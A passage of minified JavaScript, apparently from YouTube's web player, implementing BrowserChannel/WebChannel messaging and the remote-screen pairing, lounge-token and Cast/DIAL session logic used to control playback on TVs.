      if ("function" !== typeof a) throw Error("Fn must not be null and must be a function");
      return g.Ra.setTimeout(function () {
        a();
      }, b);
    },
    M8 = function (a) {
      L8.dispatchEvent(new azb(L8, a));
    },
    azb = function (a) {
      g.wb.call(this, "statevent", a);
    },
    N8 = function (a, b, c, d) {
      this.j = a;
      this.D = b;
      this.N = c;
      this.K = d || 1;
      this.B = 45E3;
      this.C = new g.$o(this);
      this.G = new g.cg();
      this.G.setInterval(250);
    },
    czb = function (a, b, c) {
      a.Ox = 1;
      a.Zr = $7(b.clone());
      a.Lu = c;
      a.Fa = !0;
      bzb(a, null);
    },
    dzb = function (a, b, c, d, e) {
      a.Ox = 1;
      a.Zr = $7(b.clone());
      a.Lu = null;
      a.Fa = c;
      e && (a.h_ = !1);
      bzb(a, d);
    },
    bzb = function (a, b) {
      a.Nx = Date.now();
      O8(a);
      a.hs = a.Zr.clone();
      a8(a.hs, "t", a.K);
      a.qG = 0;
      a.aj = a.j.FL(a.j.fC() ? b : null);
      0 < a.DL && (a.oG = new q8((0, g.fb)(a.kT, a, a.aj), a.DL));
      a.C.Ta(a.aj, "readystatechange", a.q2);
      b = a.Ku ? g.qd(a.Ku) : {};
      a.Lu ? (a.pG = "POST", b["Content-Type"] = "application/x-www-form-urlencoded", a.aj.send(a.hs, a.pG, a.Lu, b)) : (a.pG = "GET", a.h_ && !g.Sc && (b.Connection = "close"), a.aj.send(a.hs, a.pG, null, b));
      a.j.Nn(1);
    },
    gzb = function (a, b) {
      var c = a.qG,
        d = b.indexOf("\n", c);
      if (-1 == d) return ezb;
      c = Number(b.substring(c, d));
      if (isNaN(c)) return fzb;
      d += 1;
      if (d + c > b.length) return ezb;
      b = b.slice(d, d + c);
      a.qG = d + c;
      return b;
    },
    izb = function (a, b) {
      a.Nx = Date.now();
      O8(a);
      var c = b ? window.location.hostname : "";
      a.hs = a.Zr.clone();
      g.uo(a.hs, "DOMAIN", c);
      g.uo(a.hs, "t", a.K);
      try {
        a.oo = new ActiveXObject("htmlfile");
      } catch (m) {
        P8(a);
        a.gs = 7;
        M8(22);
        Q8(a);
        return;
      }
      var d = "<html><body>";
      if (b) {
        var e = "";
        for (b = 0; b < c.length; b++) {
          var f = c.charAt(b);
          if ("<" == f) f = e + "\\x3c";else if (">" == f) f = e + "\\x3e";else {
            if (f in R8) f = R8[f];else if (f in hzb) f = R8[f] = hzb[f];else {
              var h = f.charCodeAt(0);
              if (31 < h && 127 > h) var l = f;else {
                if (256 > h) {
                  if (l = "\\x", 16 > h || 256 < h) l += "0";
                } else l = "\\u", 4096 > h && (l += "0");
                l += h.toString(16).toUpperCase();
              }
              f = R8[f] = l;
            }
            f = e + f;
          }
          e = f;
        }
        d += '<script>document.domain="' + e + '"\x3c/script>';
      }
      d += "</body></html>";
      g.Rd("b/12014412");
      c = g.je(d);
      a.oo.open();
      a.oo.write(g.ie(c));
      a.oo.close();
      a.oo.parentWindow.m = (0, g.fb)(a.Q$, a);
      a.oo.parentWindow.d = (0, g.fb)(a.mZ, a, !0);
      a.oo.parentWindow.rpcClose = (0, g.fb)(a.mZ, a, !1);
      c = a.oo.createElement("DIV");
      a.oo.parentWindow.document.body.appendChild(c);
      d = g.ae(a.hs.toString()) || g.de;
      d = g.ye(g.Zd(d));
      g.Rd("b/12014412");
      d = g.je('<iframe src="' + d + '"></iframe>');
      g.Qba(c, d);
      a.j.Nn(1);
    },
    O8 = function (a) {
      a.EL = Date.now() + a.B;
      jzb(a, a.B);
    },
    jzb = function (a, b) {
      if (null != a.Px) throw Error("WatchDog timer not null");
      a.Px = K8((0, g.fb)(a.o2, a), b);
    },
    kzb = function (a) {
      a.Px && (g.Ra.clearTimeout(a.Px), a.Px = null);
    },
    Q8 = function (a) {
      a.j.eh() || a.Ju || a.j.rG(a);
    },
    P8 = function (a) {
      kzb(a);
      g.sb(a.oG);
      a.oG = null;
      a.G.stop();
      a.C.Lf();
      if (a.aj) {
        var b = a.aj;
        a.aj = null;
        b.abort();
        b.dispose();
      }
      a.oo && (a.oo = null);
    },
    lzb = function (a, b) {
      try {
        a.j.lT(a, b), a.j.Nn(4);
      } catch (c) {}
    },
    nzb = function (a, b, c, d, e) {
      if (0 == d) c(!1);else {
        var f = e || 0;
        d--;
        mzb(a, b, function (h) {
          h ? c(!0) : g.Ra.setTimeout(function () {
            nzb(a, b, c, d, f);
          }, f);
        });
      }
    },
    mzb = function (a, b, c) {
      var d = new Image();
      d.onload = function () {
        try {
          S8(d), c(!0);
        } catch (e) {}
      };
      d.onerror = function () {
        try {
          S8(d), c(!1);
        } catch (e) {}
      };
      d.onabort = function () {
        try {
          S8(d), c(!1);
        } catch (e) {}
      };
      d.ontimeout = function () {
        try {
          S8(d), c(!1);
        } catch (e) {}
      };
      g.Ra.setTimeout(function () {
        if (d.ontimeout) d.ontimeout();
      }, b);
      d.src = a;
    },
    S8 = function (a) {
      a.onload = null;
      a.onerror = null;
      a.onabort = null;
      a.ontimeout = null;
    },
    ozb = function (a) {
      this.j = a;
      this.B = new r8();
    },
    pzb = function (a) {
      var b = T8(a.j, a.HC, "/mail/images/cleardot.gif");
      $7(b);
      nzb(b.toString(), 5E3, (0, g.fb)(a.O4, a), 3, 2E3);
      a.Nn(1);
    },
    qzb = function (a) {
      var b = a.j.K;
      if (null != b) M8(5), b ? (M8(11), U8(a.j, a, !1)) : (M8(12), U8(a.j, a, !0));else if (a.Gj = new N8(a), a.Gj.Ku = a.GL, b = a.j, b = T8(b, b.fC() ? a.eC : null, a.HL), M8(5), !g.af || g.Rc(10)) a8(b, "TYPE", "xmlhttp"), dzb(a.Gj, b, !1, a.eC, !1);else {
        a8(b, "TYPE", "html");
        var c = a.Gj;
        a = !!a.eC;
        c.Ox = 3;
        c.Zr = $7(b.clone());
        izb(c, a);
      }
    },
    rzb = function (a, b, c) {
      this.j = 1;
      this.B = [];
      this.C = [];
      this.G = new r8();
      this.Y = a || null;
      this.K = null != b ? b : null;
      this.Z = c || !1;
    },
    szb = function (a, b) {
      this.j = a;
      this.map = b;
      this.context = null;
    },
    tzb = function (a, b, c, d) {
      g.wb.call(this, "timingevent", a);
      this.size = b;
      this.kB = d;
    },
    uzb = function (a) {
      g.wb.call(this, "serverreachability", a);
    },
    wzb = function (a) {
      a.s2(1, 0);
      a.sG = T8(a, null, a.IL);
      vzb(a);
    },
    xzb = function (a) {
      a.Ks && (a.Ks.abort(), a.Ks = null);
      a.Lg && (a.Lg.cancel(), a.Lg = null);
      a.uq && (g.Ra.clearTimeout(a.uq), a.uq = null);
      V8(a);
      a.Rj && (a.Rj.cancel(), a.Rj = null);
      a.qs && (g.Ra.clearTimeout(a.qs), a.qs = null);
    },
    yzb = function (a, b) {
      if (0 == a.j) throw Error("Invalid operation: sending map when state is closed");
      a.B.push(new szb(a.t2++, b));
      2 != a.j && 3 != a.j || vzb(a);
    },
    zzb = function (a) {
      var b = 0;
      a.Lg && b++;
      a.Rj && b++;
      return b;
    },
    vzb = function (a) {
      a.Rj || a.qs || (a.qs = K8((0, g.fb)(a.pT, a), 0), a.Rx = 0);
    },
    Czb = function (a, b) {
      if (1 == a.j) {
        if (!b) {
          a.hC = Math.floor(1E5 * Math.random());
          b = a.hC++;
          var c = new N8(a, "", b);
          c.Ku = a.Do;
          var d = Azb(a),
            e = a.sG.clone();
          g.uo(e, "RID", b);
          g.uo(e, "CVER", "1");
          W8(a, e);
          czb(c, e, d);
          a.Rj = c;
          a.j = 2;
        }
      } else 3 == a.j && (b ? Bzb(a, b) : 0 == a.B.length || a.Rj || Bzb(a));
    },
    Bzb = function (a, b) {
      if (b) {
        if (6 < a.Mu) {
          a.B = a.C.concat(a.B);
          a.C.length = 0;
          var c = a.hC - 1;
          b = Azb(a);
        } else c = b.N, b = b.Lu;
      } else c = a.hC++, b = Azb(a);
      var d = a.sG.clone();
      g.uo(d, "SID", a.D);
      g.uo(d, "RID", c);
      g.uo(d, "AID", a.Sx);
      W8(a, d);
      c = new N8(a, a.D, c, a.Rx + 1);
      c.Ku = a.Do;
      c.setTimeout(1E4 + Math.round(1E4 * Math.random()));
      a.Rj = c;
      czb(c, d, b);
    },
    W8 = function (a, b) {
      a.Ei && (a = a.Ei.tT()) && g.Wc(a, function (c, d) {
        g.uo(b, d, c);
      });
    },
    Azb = function (a) {
      var b = Math.min(a.B.length, 1E3),
        c = ["count=" + b];
      if (6 < a.Mu && 0 < b) {
        var d = a.B[0].j;
        c.push("ofs=" + d);
      } else d = 0;
      for (var e = {}, f = 0; f < b; e = {
        iA: e.iA
      }, f++) {
        e.iA = a.B[f].j;
        var h = a.B[f].map;
        e.iA = 6 >= a.Mu ? f : e.iA - d;
        try {
          g.Wc(h, function (l) {
            return function (m, n) {
              c.push("req" + l.iA + "_" + n + "=" + encodeURIComponent(m));
            };
          }(e));
        } catch (l) {
          c.push("req" + e.iA + "_type=" + encodeURIComponent("_badmap"));
        }
      }
      a.C = a.C.concat(a.B.splice(0, b));
      return c.join("&");
    },
    Dzb = function (a) {
      a.Lg || a.uq || (a.N = 1, a.uq = K8((0, g.fb)(a.oT, a), 0), a.Qx = 0);
    },
    Fzb = function (a) {
      if (a.Lg || a.uq || 3 <= a.Qx) return !1;
      a.N++;
      a.uq = K8((0, g.fb)(a.oT, a), Ezb(a, a.Qx));
      a.Qx++;
      return !0;
    },
    U8 = function (a, b, c) {
      a.eL = null == a.K ? c : !a.K;
      a.Eo = b.tq;
      a.Z || wzb(a);
    },
    V8 = function (a) {
      null != a.Nu && (g.Ra.clearTimeout(a.Nu), a.Nu = null);
    },
    Ezb = function (a, b) {
      var c = 5E3 + Math.floor(1E4 * Math.random());
      a.isActive() || (c *= 2);
      return c * b;
    },
    X8 = function (a, b) {
      if (2 == b || 9 == b) {
        var c = null;
        a.Ei && (c = null);
        var d = (0, g.fb)(a.Pba, a);
        c || (c = new g.mo("//www.google.com/images/cleardot.gif"), $7(c));
        mzb(c.toString(), 1E4, d);
      } else M8(2);
      Gzb(a, b);
    },
    Gzb = function (a, b) {
      a.j = 0;
      a.Ei && a.Ei.qT(b);
      Hzb(a);
      xzb(a);
    },
    Hzb = function (a) {
      a.j = 0;
      a.Eo = -1;
      if (a.Ei) if (0 == a.C.length && 0 == a.B.length) a.Ei.JL();else {
        var b = g.Jb(a.C),
          c = g.Jb(a.B);
        a.C.length = 0;
        a.B.length = 0;
        a.Ei.JL(b, c);
      }
    },
    T8 = function (a, b, c) {
      var d = g.vo(c);
      if ("" != d.j) b && g.oo(d, b + "." + d.j), g.po(d, d.D);else {
        var e = window.location;
        d = jxb(e.protocol, b ? b + "." + e.hostname : e.hostname, +e.port, c);
      }
      a.gC && g.Wc(a.gC, function (f, h) {
        g.uo(d, h, f);
      });
      g.uo(d, "VER", a.Mu);
      W8(a, d);
      return d;
    },
    Izb = function () {},
    Jzb = function () {
      this.j = [];
      this.B = [];
    },
    Kzb = function (a) {
      g.wb.call(this, "channelMessage");
      this.message = a;
    },
    Lzb = function (a) {
      g.wb.call(this, "channelError");
      this.error = a;
    },
    Mzb = function (a, b) {
      this.action = a;
      this.params = b || {};
    },
    Y8 = function (a, b) {
      g.J.call(this);
      this.j = new g.Bu(this.I$, 0, this);
      g.L(this, this.j);
      this.Pi = 5E3;
      this.B = 0;
      if ("function" === typeof a) b && (a = (0, g.fb)(a, b));else if (a && "function" === typeof a.handleEvent) a = (0, g.fb)(a.handleEvent, a);else throw Error("Invalid listener argument");
      this.C = a;
    },
    Nzb = function (a, b, c, d, e) {
      c = void 0 === c ? !1 : c;
      d = void 0 === d ? function () {
        return "";
      } : d;
      e = void 0 === e ? !1 : e;
      this.Aa = a;
      this.N = b;
      this.C = new g.fv();
      this.B = new Y8(this.aba, this);
      this.j = null;
      this.ma = !1;
      this.K = null;
      this.Y = "";
      this.Z = this.G = 0;
      this.D = [];
      this.Sa = c;
      this.qa = d;
      this.Va = e;
      this.Na = new kxb();
      this.Ea = new mxb();
      this.Ka = new oxb();
      this.Fa = new qxb();
      this.Ya = new sxb();
      this.Za = new txb();
    },
    Ozb = function (a) {
      if (a.j) {
        var b = a.qa(),
          c = a.j.Do || {};
        b ? c["x-youtube-lounge-xsrf-token"] = b : delete c["x-youtube-lounge-xsrf-token"];
        a.j.Do = c;
      }
    },
    Z8 = function (a) {
      this.scheme = "https";
      this.port = this.domain = "";
      this.j = "/api/lounge";
      this.B = !0;
      a = a || document.location.href;
      var b = Number(g.Gl(4, a)) || "";
      b && (this.port = ":" + b);
      this.domain = g.Hl(a) || "";
      a = g.oc();
      0 <= a.search("MSIE") && (a = a.match(/MSIE ([\d.]+)/)[1], 0 > g.mc(a, "10.0") && (this.B = !1));
    },
    $8 = function (a, b) {
      var c = a.j;
      a.B && (c = a.scheme + "://" + a.domain + a.port + a.j);
      return g.tm(c + b, {});
    },
    Pzb = function (a, b, c, d, e) {
      a = {
        format: "JSON",
        method: "POST",
        context: a,
        timeout: 5E3,
        withCredentials: !1,
        onSuccess: g.gb(a.D, d, !0),
        onError: g.gb(a.C, e),
        onTimeout: g.gb(a.G, e)
      };
      c && (a.postParams = c, a.headers = {
        "Content-Type": "application/x-www-form-urlencoded"
      });
      return g.WB(b, a);
    },
    Qzb = function (a, b) {
      g.Ed.call(this);
      var c = this;
      this.Cd = a();
      this.Cd.subscribe("handlerOpened", this.A2, this);
      this.Cd.subscribe("handlerClosed", this.w2, this);
      this.Cd.subscribe("handlerError", function (d, e) {
        c.onError(e);
      });
      this.Cd.subscribe("handlerMessage", this.z2, this);
      this.j = b;
    },
    Rzb = function (a, b, c) {
      var d = this;
      c = void 0 === c ? function () {
        return "";
      } : c;
      var e = void 0 === e ? new Wyb() : e;
      var f = void 0 === f ? new g.fv() : f;
      this.pathPrefix = a;
      this.j = b;
      this.Aa = c;
      this.G = f;
      this.Z = null;
      this.Y = this.N = 0;
      this.channel = null;
      this.K = 0;
      this.C = new Y8(function () {
        d.C.isActive();
        var h;
        0 === (null == (h = d.channel) ? void 0 : zyb(new Zyb(h, h.j).j.B)) && d.connect(d.Z, d.N);
      });
      this.D = {};
      this.B = {};
      this.ma = !1;
      this.logger = null;
      this.qa = [];
      this.Fg = void 0;
      this.Na = new kxb();
      this.Ea = new mxb();
      this.Ka = new oxb();
      this.Fa = new qxb();
    },
    Szb = function (a) {
      g.xd(a.channel, "m", function () {
        a.K = 3;
        a.C.reset();
        a.Z = null;
        a.N = 0;
        for (var b = g.v(a.qa), c = b.next(); !c.done; c = b.next()) c = c.value, a.channel && a.channel.send(c);
        a.qa = [];
        a.oa("webChannelOpened");
        lxb(a.Na, "WEB_CHANNEL");
      });
      g.xd(a.channel, "n", function () {
        a.K = 0;
        a.C.isActive() || a.oa("webChannelClosed");
        var b,
          c = null == (b = a.channel) ? void 0 : $yb(new Zyb(b, b.j));
        c && (a.qa = [].concat(g.ra(c)));
        nxb(a.Ea, "WEB_CHANNEL");
      });
      g.xd(a.channel, "p", function (b) {
        var c = b.data;
        "gracefulReconnect" === c[0] ? (a.C.start(), a.channel && a.channel.close()) : a.oa("webChannelMessage", new Mzb(c[0], c[1]));
        a.Fg = b.statusCode;
        pxb(a.Ka, "WEB_CHANNEL");
      });
      g.xd(a.channel, "o", function () {
        401 === a.Fg || a.C.start();
        a.oa("webChannelError");
        rxb(a.Fa, "WEB_CHANNEL");
      });
    },
    Tzb = function (a) {
      var b = a.Aa();
      b ? a.D["x-youtube-lounge-xsrf-token"] = b : delete a.D["x-youtube-lounge-xsrf-token"];
    },
    Uzb = function (a) {
      g.Ed.call(this);
      this.j = a();
      this.j.subscribe("webChannelOpened", this.D2, this);
      this.j.subscribe("webChannelClosed", this.B2, this);
      this.j.subscribe("webChannelError", this.onError, this);
      this.j.subscribe("webChannelMessage", this.C2, this);
    },
    Vzb = function (a, b, c, d, e) {
      function f() {
        return new Nzb($8(a, "/bc"), b, !1, c, d);
      }
      c = void 0 === c ? function () {
        return "";
      } : c;
      return g.AB("enable_mdx_web_channel_desktop") ? new Uzb(function () {
        return new Rzb($8(a, "/wc"), b, c);
      }) : new Qzb(f, e);
    },
    Zzb = function () {
      var a = Wzb;
      Xzb();
      a9.push(a);
      Yzb();
    },
    b9 = function (a, b) {
      Xzb();
      var c = $zb(a, String(b));
      0 == a9.length ? aAb(c) : (Yzb(), g.cc(a9, function (d) {
        d(c);
      }));
    },
    c9 = function (a) {
      b9("CP", a);
    },
    Xzb = function () {
      a9 || (a9 = g.Ta("yt.mdx.remote.debug.handlers_") || [], g.Sa("yt.mdx.remote.debug.handlers_", a9));
    },
    aAb = function (a) {
      var b = (d9 + 1) % 50;
      d9 = b;
      e9[b] = a;
      f9 || (f9 = 49 == b);
    },
    Yzb = function () {
      var a = a9;
      if (e9[0]) {
        var b = f9 ? d9 : -1;
        do {
          b = (b + 1) % 50;
          var c = e9[b];
          g.cc(a, function (d) {
            d(c);
          });
        } while (b != d9);
        e9 = Array(50);
        d9 = -1;
        f9 = !1;
      }
    },
    $zb = function (a, b) {
      var c = (Date.now() - bAb) / 1E3;
      c.toFixed && (c = c.toFixed(3));
      var d = [];
      d.push("[", c + "s", "] ");
      d.push("[", "yt.mdx.remote", "] ");
      d.push(a + ": " + b, "\n");
      return d.join("");
    },
    g9 = function (a) {
      g.TF.call(this);
      this.K = a;
      this.screens = [];
    },
    cAb = function (a, b) {
      var c = a.get(b.uuid) || a.get(b.id);
      if (c) return a = c.name, c.id = b.id || c.id, c.name = b.name, c.token = b.token, c.uuid = b.uuid || c.uuid, c.name != a;
      a.screens.push(b);
      return !0;
    },
    dAb = function (a, b) {
      var c = a.screens.length != b.length;
      a.screens = g.Zs(a.screens, function (f) {
        return !!Fxb(b, f);
      });
      for (var d = 0, e = b.length; d < e; d++) c = cAb(a, b[d]) || c;
      return c;
    },
    eAb = function (a, b) {
      var c = a.screens.length;
      a.screens = g.Zs(a.screens, function (d) {
        return !(d || b ? !d != !b ? 0 : d.id == b.id : 1);
      });
      return a.screens.length < c;
    },
    fAb = function (a, b, c, d, e) {
      g.TF.call(this);
      this.C = a;
      this.N = b;
      this.D = c;
      this.K = d;
      this.G = e;
      this.B = 0;
      this.j = null;
      this.hd = NaN;
    },
    i9 = function (a) {
      g9.call(this, "LocalScreenService");
      this.B = a;
      this.j = NaN;
      h9(this);
      this.info("Initializing with " + Cxb(this.screens));
    },
    gAb = function (a) {
      if (a.screens.length) {
        var b = g.lr(a.screens, function (d) {
            return d.id;
          }),
          c = $8(a.B, "/pairing/get_lounge_token_batch");
        Pzb(a.B, c, {
          screen_ids: b.join(",")
        }, (0, g.fb)(a.G6, a), (0, g.fb)(a.F6, a));
      }
    },
    h9 = function (a) {
      if (g.AB("deprecate_pair_servlet_enabled")) return dAb(a, []);
      var b = Bxb(Mxb());
      b = g.Zs(b, function (c) {
        return !c.uuid;
      });
      return dAb(a, b);
    },
    j9 = function (a, b) {
      Oxb(g.lr(a.screens, zxb));
      b && Nxb();
    },
    iAb = function (a, b) {
      g.TF.call(this);
      this.K = b;
      b = (b = g.OC("yt-remote-online-screen-ids") || "") ? b.split(",") : [];
      for (var c = {}, d = this.K(), e = d.length, f = 0; f < e; ++f) {
        var h = d[f].id;
        c[h] = g.Cb(b, h);
      }
      this.j = c;
      this.G = a;
      this.C = this.D = NaN;
      this.B = null;
      hAb("Initialized with " + g.Mm(this.j));
    },
    jAb = function (a, b, c) {
      var d = $8(a.G, "/pairing/get_screen_availability");
      Pzb(a.G, d, {
        lounge_token: b.token
      }, (0, g.fb)(function (e) {
        e = e.screens || [];
        for (var f = e.length, h = 0; h < f; ++h) if (e[h].loungeToken == b.token) {
          c("online" == e[h].status);
          return;
        }
        c(!1);
      }, a), (0, g.fb)(function () {
        c(!1);
      }, a));
    },
    lAb = function (a, b) {
      a: if (gxb(b) != gxb(a.j)) var c = !1;else {
        c = g.cd(b);
        for (var d = c.length, e = 0; e < d; ++e) if (!a.j[c[e]]) {
          c = !1;
          break a;
        }
        c = !0;
      }
      c || (hAb("Updated online screens: " + g.Mm(a.j)), a.j = b, a.oa("screenChange"));
      kAb(a);
    },
    k9 = function (a) {
      isNaN(a.C) || g.TB(a.C);
      a.C = g.RB((0, g.fb)(a.rR, a), 0 < a.D && a.D < g.kb() ? 2E4 : 1E4);
    },
    hAb = function (a) {
      b9("OnlineScreenService", a);
    },
    mAb = function (a) {
      var b = {};
      g.cc(a.K(), function (c) {
        c.token ? b[c.token] = c.id : this.dg("Requesting availability of screen w/o lounge token.");
      });
      return b;
    },
    kAb = function (a) {
      a = g.cd(g.Xc(a.j, function (b) {
        return b;
      }));
      g.Xb(a);
      a.length ? g.NC("yt-remote-online-screen-ids", a.join(","), 60) : g.PC("yt-remote-online-screen-ids");
    },
    l9 = function (a, b) {
      b = void 0 === b ? !1 : b;
      g9.call(this, "ScreenService");
      this.D = a;
      this.N = b;
      this.j = this.B = null;
      this.C = [];
      this.G = {};
      nAb(this);
    },
    pAb = function (a, b, c, d, e, f) {
      a.info("getAutomaticScreenByIds " + c + " / " + b);
      c || (c = a.G[b]);
      var h = a.Lk(),
        l = c ? h8(h, c) : null;
      c && (a.N || l) || (l = h8(h, b));
      if (l) {
        l.uuid = b;
        var m = m9(a, l);
        jAb(a.j, m, function (n) {
          e(n ? m : null);
        });
      } else c ? oAb(a, c, (0, g.fb)(function (n) {
        var p = m9(this, new e8({
          name: d,
          screenId: c,
          loungeToken: n,
          dialId: b || ""
        }));
        jAb(this.j, p, function (q) {
          e(q ? p : null);
        });
      }, a), f) : e(null);
    },
    qAb = function (a, b) {
      for (var c = a.screens.length, d = 0; d < c; ++d) if (a.screens[d].name == b) return a.screens[d];
      return null;
    },
    rAb = function (a, b, c) {
      jAb(a.j, b, c);
    },
    oAb = function (a, b, c, d) {
      a.info("requestLoungeToken_ for " + b);
      var e = {
        postParams: {
          screen_ids: b
        },
        method: "POST",
        context: a,
        onSuccess: function (f, h) {
          f = h && h.screens || [];
          f[0] && f[0].screenId == b ? c(f[0].loungeToken) : d(Error("Missing lounge token in token response"));
        },
        onError: function () {
          d(Error("Request screen lounge token failed"));
        }
      };
      g.WB($8(a.D, "/pairing/get_lounge_token_batch"), e);
    },
    sAb = function (a) {
      a.screens = a.B.Lk();
      var b = a.G,
        c = {},
        d;
      for (d in b) c[b[d]] = d;
      b = a.screens.length;
      for (d = 0; d < b; ++d) {
        var e = a.screens[d];
        e.uuid = c[e.id] || "";
      }
      a.info("Updated manual screens: " + Cxb(a.screens));
    },
    nAb = function (a) {
      tAb(a);
      a.B = new i9(a.D);
      a.B.subscribe("screenChange", (0, g.fb)(a.Q6, a));
      sAb(a);
      a.N || (a.C = Bxb(g.OC("yt-remote-automatic-screen-cache") || []));
      tAb(a);
      a.info("Initializing automatic screens: " + Cxb(a.C));
      a.j = new iAb(a.D, (0, g.fb)(a.Lk, a, !0));
      a.j.subscribe("screenChange", (0, g.fb)(function () {
        this.oa("onlineScreenChange");
      }, a));
    },
    m9 = function (a, b) {
      var c = a.get(b.id);
      c ? (c.uuid = b.uuid, b = c) : ((c = h8(a.C, b.uuid)) ? (c.id = b.id, c.token = b.token, b = c) : a.C.push(b), a.N || uAb(a));
      tAb(a);
      a.G[b.uuid] = b.id;
      g.NC("yt-remote-device-id-map", a.G, 31536E3);
      return b;
    },
    uAb = function (a) {
      a = g.Zs(a.C, function (b) {
        return "shortLived" != b.idType;
      });
      g.NC("yt-remote-automatic-screen-cache", g.lr(a, zxb));
    },
    tAb = function (a) {
      a.G = g.OC("yt-remote-device-id-map") || {};
    },
    n9 = function (a, b, c) {
      g.TF.call(this);
      this.Fa = c;
      this.D = a;
      this.B = b;
      this.j = null;
    },
    o9 = function (a, b) {
      a.j = b;
      a.oa("sessionScreen", a.j);
    },
    vAb = function (a, b) {
      a.j && (a.j.token = b, m9(a.D, a.j));
      a.oa("sessionScreen", a.j);
    },
    p9 = function (a, b) {
      b9(a.Fa, b);
    },
    q9 = function (a, b, c) {
      n9.call(this, a, b, "CastSession");
      var d = this;
      this.config_ = c;
      this.C = null;
      this.qa = (0, g.fb)(this.I2, this);
      this.Ea = (0, g.fb)(this.Y$, this);
      this.ma = g.RB(function () {
        wAb(d, null);
      }, 12E4);
      this.N = this.G = this.K = this.Z = 0;
      this.Aa = !1;
      this.Y = "unknown";
    },
    yAb = function (a, b) {
      g.TB(a.N);
      a.N = 0;
      0 == b ? xAb(a) : a.N = g.RB(function () {
        xAb(a);
      }, b);
    },
    xAb = function (a) {
      zAb(a, "getLoungeToken");
      g.TB(a.G);
      a.G = g.RB(function () {
        AAb(a, null);
      }, 3E4);
    },
    zAb = function (a, b) {
      a.info("sendYoutubeMessage_: " + b + " " + g.Mm());
      var c = {};
      c.type = b;
      a.C ? a.C.sendMessage("urn:x-cast:com.google.youtube.mdx", c, function () {}, (0, g.fb)(function () {
        p9(this, "Failed to send message: " + b + ".");
      }, a)) : p9(a, "Sending yt message without session: " + g.Mm(c));
    },
    BAb = function (a, b) {
      b ? (a.info("onConnectedScreenId_: Received screenId: " + b), a.j && a.j.id == b || a.IW(b, function (c) {
        o9(a, c);
      }, function () {
        return a.vj();
      }, 5)) : a.vj(Error("Waiting for session status timed out."));
    },
    DAb = function (a, b, c) {
      a.info("onConnectedScreenData_: Received screenData: " + JSON.stringify(b));
      var d = new e8(b);
      CAb(a, d, function (e) {
        e ? (a.Aa = !0, m9(a.D, d), o9(a, d), a.Y = "unknown", yAb(a, c)) : (g.DB(Error("CastSession, RemoteScreen from screenData: " + JSON.stringify(b) + " is not online.")), a.vj());
      }, 5);
    },
    wAb = function (a, b) {
      g.TB(a.ma);
      a.ma = 0;
      b ? a.config_.enableCastLoungeToken && b.loungeToken ? b.deviceId ? a.j && a.j.uuid == b.deviceId || (b.loungeTokenRefreshIntervalMs ? DAb(a, {
        name: a.B.friendlyName,
        screenId: b.screenId,
        loungeToken: b.loungeToken,
        dialId: b.deviceId,
        screenIdType: "shortLived"
      }, b.loungeTokenRefreshIntervalMs) : (g.DB(Error("No loungeTokenRefreshIntervalMs presents in mdxSessionStatusData: " + JSON.stringify(b) + ".")), BAb(a, b.screenId))) : (g.DB(Error("No device id presents in mdxSessionStatusData: " + JSON.stringify(b) + ".")), BAb(a, b.screenId)) : BAb(a, b.screenId) : a.vj(Error("Waiting for session status timed out."));
    },
    AAb = function (a, b) {
      g.TB(a.G);
      a.G = 0;
      var c = null;
      if (b) {
        if (b.loungeToken) {
          var d;
          (null == (d = a.j) ? void 0 : d.token) == b.loungeToken && (c = "staleLoungeToken");
        } else c = "missingLoungeToken";
      } else c = "noLoungeTokenResponse";
      c ? (a.info("Did not receive a new lounge token in onLoungeToken_ with data: " + (JSON.stringify(b) + ", error: " + c)), a.Y = c, yAb(a, 3E4)) : (vAb(a, b.loungeToken), a.Aa = !1, a.Y = "unknown", yAb(a, b.loungeTokenRefreshIntervalMs));
    },
    CAb = function (a, b, c, d) {
      g.TB(a.K);
      a.K = 0;
      rAb(a.D, b, function (e) {
        e || 0 > d ? c(e) : a.K = g.RB(function () {
          CAb(a, b, c, d - 1);
        }, 300);
      });
    },
    EAb = function (a) {
      g.TB(a.Z);
      a.Z = 0;
      g.TB(a.K);
      a.K = 0;
      g.TB(a.ma);
      a.ma = 0;
      g.TB(a.G);
      a.G = 0;
      g.TB(a.N);
      a.N = 0;
    },
    r9 = function (a, b, c, d) {
      n9.call(this, a, b, "DialSession");
      this.config_ = d;
      this.C = this.Z = null;
      this.Ea = "";
      this.Sa = c;
      this.Na = null;
      this.ma = function () {};
      this.Y = NaN;
      this.Ka = (0, g.fb)(this.J2, this);
      this.G = function () {};
      this.N = this.K = 0;
      this.qa = !1;
      this.Aa = "unknown";
    },
    s9 = function (a) {
      var b;
      return !!(a.config_.enableDialLoungeToken && (null == (b = a.C) ? 0 : b.getDialAppInfo));
    },
    FAb = function (a) {
      a.G = a.D.vT(a.Ea, a.B.label, a.B.friendlyName, s9(a), function (b, c) {
        a.G = function () {};
        a.qa = !0;
        o9(a, b);
        "shortLived" == b.idType && 0 < c && t9(a, c);
      }, function (b) {
        a.G = function () {};
        a.vj(b);
      });
    },
    GAb = function (a) {
      var b = {};
      b.pairingCode = a.Ea;
      b.theme = a.Sa;
      Qxb() && (b.env_useStageMdx = 1);
      return g.Ml(b);
    },
    HAb = function (a) {
      return new Promise(function (b) {
        a.Ea = Dxb();
        if (a.Na) {
          var c = new chrome.cast.DialLaunchResponse(!0, GAb(a));
          b(c);
          FAb(a);
        } else a.ma = function () {
          g.TB(a.Y);
          a.ma = function () {};
          a.Y = NaN;
          var d = new chrome.cast.DialLaunchResponse(!0, GAb(a));
          b(d);
          FAb(a);
        }, a.Y = g.RB(function () {
          a.ma();
        }, 100);
      });
    },
    JAb = function (a, b, c) {
      a.info("initOnConnectedScreenDataPromise_: Received screenData: " + JSON.stringify(b));
      var d = new e8(b);
      return new Promise(function (e) {
        IAb(a, d, function (f) {
          f ? (a.qa = !0, m9(a.D, d), o9(a, d), t9(a, c)) : g.DB(Error("DialSession, RemoteScreen from screenData: " + JSON.stringify(b) + " is not online."));
          e(f);
        }, 5);
      }).then(function (e) {
        return e ? new chrome.cast.DialLaunchResponse(!1) : HAb(a);
      });
    },
    KAb = function (a, b) {
      var c = a.Z.receiver.label,
        d = a.B.friendlyName;
      return new Promise(function (e) {
        pAb(a.D, c, b, d, function (f) {
          f && f.token && o9(a, f);
          e(f);
        }, function (f) {
          p9(a, "Failed to get DIAL screen: " + f);
          e(null);
        });
      }).then(function (e) {
        return e && e.token ? new chrome.cast.DialLaunchResponse(!1) : HAb(a);
      });
    },
    IAb = function (a, b, c, d) {
      g.TB(a.K);
      a.K = 0;
      rAb(a.D, b, function (e) {
        e || 0 > d ? c(e) : a.K = g.RB(function () {
